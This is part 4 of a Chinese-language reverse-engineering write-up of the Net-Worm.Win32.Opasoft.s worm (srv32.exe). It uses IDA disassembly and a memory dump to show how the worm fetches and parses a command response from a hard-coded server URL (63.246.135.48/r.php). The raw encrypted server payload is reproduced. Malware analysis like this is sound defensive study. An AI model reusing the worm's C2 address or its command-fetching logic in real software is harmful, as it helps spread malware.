
# 蠕虫 srv32.exe 逆向分析笔记 4

> 原文：[`www.pediy.com/kssd/pediy07/pediy7-163.htm`](https://www.pediy.com/kssd/pediy07/pediy7-163.htm)

文件名称：`srv32.exe`  
蠕虫名称：`Net-Worm.Win32.Opasoft.s`  
工具： `IDA 4.5.1`, `SoftICE3.1`

上次我们跟到 `sub_401CF0` 里，`srv32` 会读 `http://63.246.135.48/r.php?t=0`

返回时寄存器 `EAX = 000000C8`，代码如下：

```
CODE:00402082                 call    sub_401CF0
CODE:00402087                 test    eax, eax
CODE:00402089                 jz      loc_402264      ; sub_401CF0 调用失败则跳转
CODE:0040208F                 cmp     eax, 0FFFFFFFFh
CODE:00402092                 jz      loc_402264      ; 在 sub_401CF0 中如果 InternetReadFile
CODE:00402092                                          ; 失败 3 次，则 sleep 一下再试
CODE:00402098                 cmp     eax, 0C8h       ; http 请求的返回值是否是 200
CODE:0040209D                 jnz     loc_40228A      ; http 请求失败退出线程
CODE:004020A3                 mov     eax, [ebp+lpReadUrlBuffer]
CODE:004020A9                 add     eax, [ebp+NumberOfBytesWritten]
CODE:004020AF                 mov     byte ptr [eax], 0 ; 给字符串 lpReadUrlFile 加上结束符"\0"
CODE:004020B2                 push    [ebp+lpReadUrlBuffer]
CODE:004020B8                 call    CharUpperA      ; 把字符串转大写
```

调用完 `sub_401CF0` 后会用

`cmp eax, 0FFFFFFFFh`

`cmp eax, 0C8h`

来判断返回值如果返回值等于 `0x0FFFFFFFF` 表示在函数 `sub_401CF0` 中调用 `InternetReadFile`
时失败，如果等于 `0xC8`(200)表示 http 请求成功，不等于表示请求失败会退出线程。

`sub_401CF0` 调用成功后 `lpReadUrlBuffer` 指向了从 `http://63.246.135.48/r.php?t=0` 读
出的内容，然后有调用了 `CharUpperA` 把内容中的字母转换成大写。

```
CODE:004020BD                 lea     eax, [ebp+Hex_K_Value]
CODE:004020C3                 push    eax
CODE:004020C4                 push    offset aK       ; "K"
CODE:004020C9                 push    [ebp+lpReadUrlBuffer]
CODE:004020CF                 call    sub_401C01
CODE:004020D4                 test    eax, eax
CODE:004020D6                 jz      loc_40228A      ; 退出线程
CODE:004020DC                 lea     ecx, [ebp+Hex_V_Value]
CODE:004020E2                 push    ecx
CODE:004020E3                 push    offset aV       ; "V"
CODE:004020E8                 push    [ebp+lpReadUrlBuffer]
CODE:004020EE                 call    sub_401C01
CODE:004020F3                 test    eax, eax
CODE:004020F5                 jz      loc_40228A      ; 退出线程
CODE:004020FB                 lea     ecx, [ebp+Hex_W_Value]
CODE:00402101                 push    ecx
CODE:00402102                 push    offset aW       ; "W"
CODE:00402107                 push    [ebp+lpReadUrlBuffer]
CODE:0040210D                 call    sub_401C01
CODE:00402112                 test    eax, eax
CODE:00402114                 jz      loc_40228A      ; 退出线程
CODE:0040211A                 mov     ecx, offset Hex_D_Value
CODE:0040211F                 push    ecx
CODE:00402120                 push    offset aD_0     ; "D"
CODE:00402125                 push    [ebp+lpReadUrlBuffer]
CODE:0040212B                 call    sub_401C01
CODE:00402130                 test    eax, eax
CODE:00402132                 jz      loc_40228A      ; 退出线程
CODE:00402138                 lea     eax, [ebp+Hex_T_Value]
CODE:0040213E                 push    eax
CODE:0040213F                 push    offset aT       ; "T"
CODE:00402144                 push    [ebp+lpReadUrlBuffer]
CODE:0040214A                 call    sub_401C01
CODE:0040214F                 test    eax, eax
CODE:00402151                 jz      loc_4021F0
CODE:00402157                 lea     eax, [ebp+Hex_P_Value]
CODE:0040215D                 push    eax
CODE:0040215E                 push    offset aP       ; "P"
CODE:00402163                 push    [ebp+lpReadUrlBuffer]
CODE:00402169                 call    sub_401BA9
CODE:0040216E                 cmp     eax, 8          ; 比较 Hex_P_Value 的字节数是否为 8
CODE:00402171                 jnz     loc_40228A      ; 退出线程
CODE:00402177                 lea     eax, [ebp+Hex_C_Value]
CODE:0040217D                 push    eax
CODE:0040217E                 push    offset aC       ; "C"
CODE:00402183                 push    [ebp+lpReadUrlBuffer]
CODE:00402189                 call    sub_401BA9
CODE:0040218E                 test    eax, 7
CODE:00402193                 jnz     loc_40228A      ; 退出线程
CODE:00402199                 shr     eax, 3          ; Hex_C_Value 的字节数除以 8
CODE:0040219C                 jz      loc_40228A      ; 退出线程
CODE:004021A2                 mov     [ebp+dwCount], eax
CODE:004021A8                 mov     ds:byte_406285, 0
CODE:004021AF                 push    offset aSrv32res ; lpFileName
CODE:004021B4                 call    DeleteFileA
CODE:004021B9                 mov     [ebp+var_828], 0
CODE:004021C3                 mov     [ebp+var_830], 1
CODE:004021CD
```

上面分别用参数 `"K"`, `"V"`, `"W"`, `"D"`, `"T"` 与 `lpReadUrlBuffer` 各调用了一次 `sub_401C01`,
用参数 `"P"`, `"C"` 与 `lpReadUrlBuffer` 各调用了一次 `sub_401BA9`, 还记得上次从
`http://63.246.135.48/r.php?t=0` 读出的内容吗？如下：

`lpReadUrlBuffer[] =`
`arg_lpszReadBuf[] =`
`t=8&p=1525FFFFFFFFFFFF&c=D0A58993CE0F2086053F57E8785F90C61B1F8E
20DB856D9554CC789EC0F28D7162D43FC75E50069F8793C546B88A9C4BD80D2
9241357C766626A77D951CD57CFF9794E84507F478A47EC525DAA963D70172A
D7CCC3348F3B06B598EA9A286187733F576EB82A6D43CACF4F56746595C01A6
005215EA0E0BE6D9896C25B5A9252F1949A0E964CC86EE6EA5B00F15AE9B386
15CC7594BD85B3318FDC8D905D4D5ED93AD43F211A008F6C0D0FDF702F21BA7
3349F58AA2F78F7FE0750D8C0D019846F4B63B1D5FD699F62A0D5471FC9A69B
643B20BE7A819679A89868C58723FDA8C0B503329C6B345C3D35FFA9DABC868
0BE5A90BBB8D9EE4C963619F1949EC6F8DF24E6DFC6E38CB7FB024D59E80358
08C6B054DEA68B0F8F05302C027DBC14A149C72F9F907AB3D909EDEF3085C9B
57A36D64DA14C23071AB5715BDEDDC6195D558D1310842BB33D180FF103EFF9
CF931D58E0BE5000095351DCE2D48000EAF73E84D1DD92A3B0C0CFA73179613
628E9A63E89DAB3A3C64D3573141C2D17A55064F988361669A4D0B9DAD6886E
5F32BFB2C40A7DFC8BF1457A512475D1E32B3799AF025547444C19CCE8B62BD
26EA0AF2350E421DB48EDAE22CF696946928788DD05FE044848E3FD61792192
DD6D2424DF48BC501E8200EE6AFEFF50C3B5488BAD36892C2763BCC6E7AB30C
F789426A745FD65B0C8ECE543EA0D6606D2220DEBE1D1E3D42C97FE5216BE06
A7B07DB2145491990A8AD977055A7540049AB776445ABC1F83FFF41247CD8AE
C388ECDBF562A1C9B2F850992A5AE4179915E63811D9BD958FA135E69F16B73
4E9FD4679FED9464E6EA753AFB5BB411F3AF28A7347F7B49C5A05C776AE1F9F
0FBDA29252FBF21F3F73CF888B599F0E6927B48725FA7C6A9871178EEAF6E42
BF0694A62838BDB2240DAE97F654A37F14872675A34CAA068A552AB3F53BCBB
4DD890E4788120AA3319EBE6BA4E98612EB93252D794C6BECB3464F48242F44
3B3EF0E077C15961E5406B821A626F755483A3FFA7A5E451E4CE96E149A0FBD
D&v=FEE9&d=0&w=&k=124F5"`

这里的 `"K"`, `"V"`, `"W"`, `"D"`, `"T"`, `"P"`, `"C"` 其实对应的就是 `lpReadUrlBuffer` 中
的 `"k="`, `"v="`, `"w="`, `"d="`, `"t="`, `"p="`, `"c="`，而函数 `sub_401C01` 和
`sub_401BA9` 作用就是取 `"="` 号后面的值并以十六进制存储到内存中（如：`k=124F5`
调用 `sub_401C01` 时把 `124F5` 转换成十六进制 `0x124F5` 存到 `Hex_K_Value`), 最后
内存中的数据如下：

```
00000000   08 00 00 00 01 00 00 00  C5 B7 03 00 00 00 00 00   ........欧......
00000010   38 4A F0 A0 30 00 00 00  15 25 FF FF FF FF FF FF   8J 餩 0....%???
00000020   5D 00 00 00 D0 A5 89 93  CE 0F 20 86 05 3F 57 E8   \]...啸墦? ??W?
00000030   78 5F 90 C6 1B 1F 8E 20  DB 85 6D 95 54 CC 78 9E   x_ 惼..?蹍 m 昑蘹?
00000040   C0 F2 8D 71 62 D4 3F C7  5E 50 06 9F 87 93 C5 46   莉峲 b?荿 P.焽撆 F
00000050   B8 8A 9C 4B D8 0D 29 24  13 57 C7 66 62 6A 77 D9   笂淜?)$.W 莊 bjw?
00000060   51 CD 57 CF F9 79 4E 84  50 7F 47 8A 47 EC 52 5D   Q 蚖嚣 yN 凱G 奊霷\]
00000070   AA 96 3D 70 17 2A D7 CC  C3 34 8F 3B 06 B5 98 EA   獤=p.*滋??.禈?
00000080   9A 28 61 87 73 3F 57 6E  B8 2A 6D 43 CA CF 4F 56   ?a 噑?Wn?mC 氏 OV
00000090   74 65 95 C0 1A 60 05 21  5E A0 E0 BE 6D 98 96 C2   te 暲.\`.!^\_ 嗑 m 槚?
000000A0   5B 5A 92 52 F1 94 9A 0E  96 4C C8 6E E6 EA 5B 00   [Z 扲駭?朙萵骊[.
```
